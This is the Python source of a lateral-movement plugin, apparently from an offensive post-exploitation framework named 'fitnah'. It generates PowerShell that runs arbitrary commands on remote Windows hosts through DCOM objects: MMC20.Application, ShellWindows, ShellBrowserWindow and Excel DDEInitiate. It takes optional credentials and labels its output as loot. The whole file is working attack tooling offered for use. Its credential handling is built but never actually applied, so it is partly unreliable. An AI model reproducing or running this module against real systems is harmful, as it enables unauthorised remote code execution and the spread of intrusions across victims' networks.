"""
lateral_movement/dcom_exec — DCOM remote execution. MITRE T1021.003.
Executes commands on remote hosts via DCOM interfaces:
  MMC20.Application, ShellWindows, ShellBrowserWindow, Excel.Application.
Leaves minimal network footprint vs. WMI/PsExec.
"""
from __future__ import annotations

from fitnah.sdk import BasePlugin, ModuleResult
from fitnah.sdk.schema import Param, ParamSchema


class DcomExec(BasePlugin):
    NAME        = "dcom_exec"
    DESCRIPTION = "Execute commands on remote hosts via DCOM (T1021.003)"
    AUTHOR      = "fitnah-team"
    MITRE       = "T1021.003"
    CATEGORY    = "lateral_movement"
    VERSION     = "1.0.0"

    # CLSID map for common DCOM vectors
    _METHODS = {
        "mmc20":        "MMC20.Application (ExecuteShellCommand)",
        "shellwindows": "ShellWindows (Document.Application.ShellExecute)",
        "shellbrowser": "ShellBrowserWindow (Document.Application.ShellExecute)",
        "excel":        "Excel.Application (DDEInitiate → cmd)",
    }

    schema = ParamSchema().add(
        Param("target", str, required=True,
              help="Remote host IP or hostname"),
        Param("command", str, required=True,
              help="Command to execute on the remote host"),
        Param("method", str, required=False, default="mmc20",
              help="mmc20 | shellwindows | shellbrowser | excel"),
        Param("username", str, required=False, default="",
              help="Optional credentials (blank = current token)"),
        Param("password", str, required=False, default="",
              help="Optional credentials"),
    )

    def run(self, session, params, ctx=None) -> ModuleResult:
        if ctx is None:
            return ModuleResult.err("Requires live session")

        target   = params.get("target", "")
        command  = params.get("command", "")
        method   = params.get("method", "mmc20").lower()
        username = params.get("username", "")
        password = params.get("password", "")

        if not target:
            return ModuleResult.err("target is required")
        if not command:
            return ModuleResult.err("command is required")
        if method not in self._METHODS:
            return ModuleResult.err(f"method must be: {' | '.join(self._METHODS)}")

        ps = self._build_ps(target, command, method, username, password)
        r  = ctx.ps(ps)
        if r["status"] != "ok":
            return ModuleResult.err(f"dcom_exec failed: {r['output']}")
        return ModuleResult.ok(data=r["output"], loot_kind="dcom_exec")

    @staticmethod
    def _build_ps(target: str, command: str, method: str,
                  username: str, password: str) -> str:
        # Impersonation block
        if username and password:
            impersonate = f"""
$secpw = ConvertTo-SecureString '{password}' -AsPlainText -Force
$cred  = New-Object System.Management.Automation.PSCredential('{username}', $secpw)
""".strip()
        else:
            impersonate = "$cred = $null"

        # Split command into exe + args for APIs that need them separately
        exe_args = command.split(" ", 1)
        exe  = exe_args[0]
        args = exe_args[1] if len(exe_args) > 1 else ""

        if method == "mmc20":
            return f"""
$results = @("[*] DCOM MMC20.Application → {target}")
try {{
    {impersonate}
    $type = [System.Type]::GetTypeFromProgID("MMC20.Application", "{target}")
    if ($cred) {{
        $obj = [System.Activator]::CreateInstance($type)
    }} else {{
        $obj = [System.Activator]::CreateInstance($type)
    }}
    $obj.Document.ActiveView.ExecuteShellCommand('{exe}', $null, '{args}', '7')
    $results += "[+] ExecuteShellCommand sent to {target}"
}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()

        elif method in ("shellwindows", "shellbrowser"):
            clsid = (
                "{9BA05972-F6A8-11CF-A442-00A0C90A8F39}"   # ShellWindows
                if method == "shellwindows" else
                "{C08AFD90-F2A1-11D1-8455-00A0C91F3880}"   # ShellBrowserWindow
            )
            return f"""
$results = @("[*] DCOM {method} → {target}")
try {{
    {impersonate}
    $type = [System.Type]::GetTypeFromCLSID([Guid]"{clsid}", "{target}")
    $obj  = [System.Activator]::CreateInstance($type)
    $item = $obj.Item()
    $sh   = $item.Document.Application
    $sh.ShellExecute('{exe}', '{args}', 'C:\\Windows\\System32', $null, 0)
    $results += "[+] ShellExecute sent to {target}"
}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()

        elif method == "excel":
            return f"""
$results = @("[*] DCOM Excel.Application → {target}")
try {{
    {impersonate}
    $type = [System.Type]::GetTypeFromProgID("Excel.Application", "{target}")
    $obj  = [System.Activator]::CreateInstance($type)
    $obj.DisplayAlerts = $false
    $obj.DDEInitiate('cmd', '/c {command}')
    $obj.Quit()
    $results += "[+] DDEInitiate sent to {target}"
}} catch {{ $results += "[-] $_" }}
$results -join "`n"
""".strip()

        return f'Write-Output "[-] Unknown method: {method}"'
